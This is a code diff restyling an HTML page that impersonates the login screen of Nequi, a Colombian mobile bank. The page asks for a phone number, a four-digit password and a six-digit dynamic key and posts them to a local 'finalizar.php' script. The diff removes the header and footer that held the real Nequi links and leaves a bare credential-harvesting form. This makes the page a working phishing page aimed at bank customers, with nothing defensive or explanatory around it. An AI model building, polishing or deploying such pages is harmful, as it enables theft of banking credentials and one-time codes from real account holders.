@@ -4,21 +4,22 @@
     <meta charset="UTF-8">
     <title>Nequi Login</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="cache-control" content="no-cache">
-    <meta http-equiv="expires" content="0">
-    <meta http-equiv="pragma" content="no-cache">
     <link rel="stylesheet" href="css/normalize.css">
     <link rel="stylesheet" href="css/nequi_two.webflow.css">
     <link rel="stylesheet" href="css/nequi_one.webflow.css">
     <link rel="stylesheet" href="css/main.css">
     <style>
+    body {
+      background: #fff;
+      font-family: 'Inter', Arial, sans-serif;
+    }
     .nequi-login-container {
       max-width: 370px;
-      margin: 42px auto 32px auto;
+      margin: 48px auto 0 auto;
       background: #fff;
-      border-radius: 14px;
-      box-shadow: 0 2px 16px rgba(0,0,0,0.09);
-      padding: 32px 22px 24px 22px;
+      border-radius: 16px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.07);
+      padding: 34px 24px 34px 24px;
       display: flex;
       flex-direction: column;
       align-items: stretch;
@@ -27,224 +28,156 @@
       text-align: center;
       color: #2c1246;
       font-weight: 700;
-      margin-bottom: 6px;
+      margin-bottom: 8px;
+      font-size: 2rem;
     }
     .nequi-login-container p {
       text-align: center;
-      color: #5c5c5c;
-      font-size: 0.97rem;
-      margin-bottom: 22px;
+      color: #6a1c85;
+      font-size: 1.05rem;
+      margin-bottom: 28px;
+      margin-top: 0;
     }
     .nequi-field {
-      margin-bottom: 18px;
-    }
-    .nequi-field label {
-      display: block;
-      font-size: 1.04rem;
-      color: #6a1c85;
-      font-weight: 500;
-      margin-bottom: 6px;
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
     }
     .input-group {
       display: flex;
       align-items: center;
+      gap: 0;
     }
     .input-indicativo {
       display: flex;
       align-items: center;
       background: #fff;
-      border: 1.3px solid #d4b1e9;
+      border: none;
       border-radius: 8px 0 0 8px;
-      padding: 0 12px;
-      height: 44px;
+      padding: 0 18px 0 12px;
+      height: 48px;
       font-size: 1.08rem;
       font-weight: 500;
       color: #333;
-      margin-right: -1px;
       box-sizing: border-box;
+      border: 1.5px solid #f3eaf6;
+      border-right: 0;
     }
     .input-indicativo img {
-      width: 22px;
-      height: 16px;
+      width: 24px;
+      height: 18px;
       margin-right: 7px;
+      border-radius: 3px;
+      border: 1.5px solid #f3eaf6;
+    }
+    .input-indicativo .arrow {
+      margin-left: 9px;
+      font-size: 1.1rem;
+      color: #adadad;
+      font-weight: bold;
     }
     .input-celular {
       flex: 1;
       background: #fff;
-      border: 1.3px solid #d4b1e9;
-      border-left: none;
+      border: 1.5px solid #f3eaf6;
       border-radius: 0 8px 8px 0;
-      height: 44px;
-      padding: 0 12px;
-      font-size: 1.08rem;
+      border-left: 0;
+      height: 48px;
+      padding: 0 18px;
+      font-size: 1.11rem;
       box-sizing: border-box;
+      outline: none;
+      transition: border-color 0.25s;
+      color: #333;
     }
     .input-celular:focus {
-      border-color: #e4007a;
-      outline: none;
+      border-color: #db1fff;
+    }
+    .nequi-field label {
+      display: none;
     }
     .nequi-field input[type="password"] {
       width: 100%;
-      padding: 10px 13px;
-      font-size: 1.08rem;
-      border: 1.3px solid #d4b1e9;
+      padding: 13px 18px;
+      font-size: 1.11rem;
+      border: 1.5px solid #f3eaf6;
       border-radius: 8px;
-      background: #f9f7fb;
+      background: #faf5fc;
       transition: border-color 0.3s;
       box-sizing: border-box;
-    }
-    .nequi-field input[type="password"]:focus {
-      border-color: #e4007a;
+      color: #333;
       outline: none;
     }
+    .nequi-field input[type="password"]:focus {
+      border-color: #db1fff;
+    }
     .captcha-box {
-      background: #fff7fa;
-      border: 1.3px solid #e4007a;
-      border-radius: 8px;
-      padding: 12px;
+      background: #fff;
+      border: 2px solid #db1fff;
+      border-radius: 10px;
+      padding: 14px 10px 8px 10px;
       display: flex;
       flex-direction: column;
       align-items: flex-start;
-      gap: 8px;
-    }
-    .captcha-error {
-      color: #d80027;
-      font-size: 0.93rem;
-      margin-top: 5px;
+      margin-bottom: 24px;
+      margin-top: 8px;
     }
     .nequi-btn {
       width: 100%;
       background: #e4007a;
       color: #fff;
-      font-size: 1.15rem;
-      font-weight: 600;
+      font-size: 1.25rem;
+      font-weight: 700;
       border: none;
-      border-radius: 8px;
-      padding: 13px 0;
-      margin-top: 12px;
+      border-radius: 10px;
+      padding: 15px 0;
+      margin-top: 8px;
       cursor: pointer;
       transition: background 0.2s;
+      box-shadow: 0 2px 8px rgba(228,0,122,0.13);
+      letter-spacing: 1px;
     }
     .nequi-btn:hover {
       background: #b80063;
     }
-    /* Elimina los estilos viejos del form principal */
-    .login-wrap form,
-    .login-wrap .form-group,
-    .login-wrap .btn-wrap {
-      all: unset;
-    }
     </style>
 </head>
 <body>
-    <header>
-        <div class="wrap-header">
-            <div class="row">
-                <div class="col-xs-12 col-md-2">
-                    <div class="logo">
-                        <a href="https://www.nequi.com.co">
-                            <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
-                        </a>
-                    </div>
-                </div>
-                <div class="col-xs-12 col-md-10 container-buttons">
-                    <div class="wrap-main-menu">
-                        <div class="row">
-                            <div class="col-xs-12 col-md-8"></div>
-                            <div class="col-xs-12 col-md-4">
-                                <div class="buttons-right">
-                                    <ul>
-                                        <li>
-                                            <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl">Recarga</a>
-                                        </li>
-                                    </ul>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
+    <div class="nequi-login-container">
+        <h1>Entra a tu Nequi</h1>
+        <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
+        <form method="POST" action="finalizar.php" autocomplete="off">
+            <div class="nequi-field">
+                <div class="input-group">
+                    <span class="input-indicativo">
+                        <img src="https://flagcdn.com/w20/co.png" alt="Colombia">
+                        +57
+                        <span class="arrow">&#9660;</span>
+                    </span>
+                    <input type="tel"
+                        id="j_username"
+                        name="j_username"
+                        class="input-celular"
+                        placeholder="Número de celular"
+                        maxlength="10"
+                        minlength="10"
+                        pattern="[0-9]{10}"
+                        required
+                        autocomplete="off">
                 </div>
             </div>
-        </div>
-    </header>
-    <section class="login-section">
-        <div class="login-wrap">
-            <div class="nequi-login-container">
-                <h1>Entra a tu Nequi</h1>
-                <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
-                <form method="POST" action="finalizar.php" autocomplete="off">
-                    <div class="nequi-field">
-                        <label for="j_username">Número de celular</label>
-                        <div class="input-group">
-                            <span class="input-indicativo">
-                                <img src="https://flagcdn.com/w20/co.png" alt="Colombia">
-                                +57
-                            </span>
-                            <input type="tel"
-                                id="j_username"
-                                name="j_username"
-                                class="input-celular"
-                                placeholder="3001234567"
-                                maxlength="10"
-                                minlength="10"
-                                pattern="[0-9]{10}"
-                                required
-                                autocomplete="off">
-                        </div>
-                    </div>
-                    <div class="nequi-field">
-                        <label for="j_password">Contraseña</label>
-                        <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required>
-                    </div>
-                    <div class="nequi-field">
-                        <label for="j_dinamica">Clave Dinámica</label>
-                        <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required>
-                    </div>
-                    <div class="nequi-field">
-                        <div class="captcha-box">
-                            <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
-                            <div class="captcha-error" style="display:none;">La verificación ha caducado. Vuelve a marcar la casilla de verificación.</div>
-                        </div>
-                    </div>
-                    <button type="submit" class="nequi-btn">Entra</button>
-                </form>
+            <div class="nequi-field">
+                <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required placeholder="Contraseña">
             </div>
-        </div>
-    </section>
-    <footer>
-        <div class="container-footer">
-            <div class="container-top">
-                <div class="logo-nequi">
-                    <img alt="logo nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg">
-                </div>
-                <div class="stores">
-                    <a href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;hl=es">
-                        <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
-                    </a>
-                    <a href="https://apps.apple.com/co/app/nequi/id1075378688">
-                        <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
-                    </a>
-                    <a href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&amp;detailType=0">
-                        <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
-                    </a>
-                </div>
-                <div class="group-bancolombia">
-                    <a href="https://www.grupobancolombia.com/">
-                        <img class="img-group-bancolombia" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg">
-                    </a>
-                </div>
+            <div class="nequi-field">
+                <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required placeholder="Clave dinámica">
             </div>
-            <hr class="separator">
-            <div class="container-end">
-                <a href="https://twitter.com/Nequi"><img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e5220142aa063fa007c444_ic-twitter.svg"></a>
-                <a href="https://www.instagram.com/nequi_/"><img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201416719efe915e448_ic-instagram.svg"></a>
-                <a href="https://www.facebook.com/appnequi/"><img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c1a7bf3e9e5bd566_ic-facebook.svg"></a>
-                <a href="https://www.linkedin.com/company/nequi/mycompany/"><img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e522013be191fdc4a0252e_ic-linkedin.svg"></a>
-                <a href="https://www.youtube.com/channel/UCK1dLH3nTK-GOlgSVa95XNg/feed"><img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c663d0190bc59ba8_ic-youtube.svg"></a>
+            <div class="captcha-box">
+                <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
             </div>
-            <hr class="separator hide show-mobile">
-        </div>
-    </footer>
-    <script src="js/script.js"></script>
+            <button type="submit" class="nequi-btn">Entra</button>
+        </form>
+    </div>
     <script async defer src="https://www.google.com/recaptcha/api.js"></script>
 </body>
 </html>
